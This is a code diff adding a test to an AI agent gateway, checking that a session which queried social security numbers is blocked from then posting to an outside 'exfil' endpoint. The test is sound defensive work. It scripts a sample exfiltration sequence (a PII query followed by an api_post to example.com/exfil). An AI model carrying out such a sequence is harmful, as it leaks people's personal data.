@@ -9,6 +9,7 @@ import pytest
 
 from agentgate.gateway import Gateway, _is_valid_tool_name
 from agentgate.models import PolicyDecision, ToolCallRequest
+from agentgate.taint import TaintTracker
 from agentgate.traces import TraceStore, hash_arguments_safe
 
 
@@ -332,6 +333,48 @@ async def test_gateway_records_quarantine_observation() -> None:
     response = await gateway.call_tool(request)
     assert response.success is False
     assert quarantine.observations
+
+
+@pytest.mark.asyncio
+async def test_gateway_blocks_dlp_exfiltration_when_session_tainted() -> None:
+    policy = RecordingPolicyClient(
+        PolicyDecision(action="ALLOW", reason="ok", matched_rule="read_only_tools")
+    )
+    trace_store = TraceStore(":memory:")
+    gateway = Gateway(
+        policy_client=policy,
+        kill_switch=RecordingKillSwitch(blocked=False),
+        credential_broker=RecordingCredentialBroker(),
+        trace_store=trace_store,
+        tool_executor=RecordingToolExecutor(),
+        rate_limiter=None,
+        policy_version="v0",
+        taint_tracker=TaintTracker(trace_store=trace_store),
+    )
+
+    seed = ToolCallRequest(
+        session_id="sess-dlp",
+        tool_name="db_query",
+        arguments={"query": "SELECT ssn FROM users"},
+        context={"taint_labels": ["pii"]},
+    )
+    first = await gateway.call_tool(seed)
+    assert first.success is True
+
+    exfil = ToolCallRequest(
+        session_id="sess-dlp",
+        tool_name="api_post",
+        arguments={"endpoint": "https://example.com/exfil"},
+    )
+    second = await gateway.call_tool(exfil)
+    assert second.success is False
+    assert second.error is not None
+    assert "dlp" in second.error.lower()
+    assert len(policy.requests) == 1
+
+    events = trace_store.query(session_id="sess-dlp")
+    assert len(events) == 2
+    assert events[-1].matched_rule == "dlp_taint_guard"
 
 
 class RecordingRateLimiter:
